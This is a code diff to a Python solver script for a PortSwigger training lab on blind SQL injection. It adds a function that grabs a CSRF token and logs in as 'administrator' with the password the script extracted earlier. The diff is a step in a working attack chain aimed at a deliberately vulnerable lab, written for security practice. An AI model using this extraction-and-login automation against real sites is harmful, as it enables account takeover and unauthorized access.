@@ -2,6 +2,7 @@
 # Lab: Blind SQL injection with conditional responses
 # Lab-Link: <https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses>
 # Difficulty: PRACTITIONER
+from bs4 import BeautifulSoup
 import requests
 import sys
 import urllib3
@@ -85,6 +86,28 @@ def get_admin_password(length):
     sys.exit(-5)
 
 
+def login(host, password):
+    def get_csrf_token(client, url):
+        r = client.get(url)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        return soup.find('input', attrs={'name': 'csrf'})['value']
+    client = requests.Session()
+    client.proxies = proxies
+    client.verify = False
+
+    url = f"{host}/login"
+    csrf = get_csrf_token(client, url)
+    if not csrf:
+        print(f'[-] Unable to obtain csrf token')
+        sys.exit(-2)
+
+    payload = {'csrf': csrf,
+               'username': 'administrator',
+               'password': password}
+    r = client.post(url, data=payload, allow_redirects=True)
+    return 'Congratulations, you solved the lab!' in r.text
+
+
 if __name__ == '__main__':
     try:
         host = sys.argv[1].strip().rstrip('/')
@@ -106,3 +129,9 @@ if __name__ == '__main__':
 
         admin_password = get_admin_password(password_length)
         print(f'[+] Found administrator password: {admin_password}')
+
+        print('[ ] Try to login as administrator')
+        if login(host, admin_password):
+            print('[+] Login as administrator successful')
+        else:
+            print('[-] Failed to login as administrator')
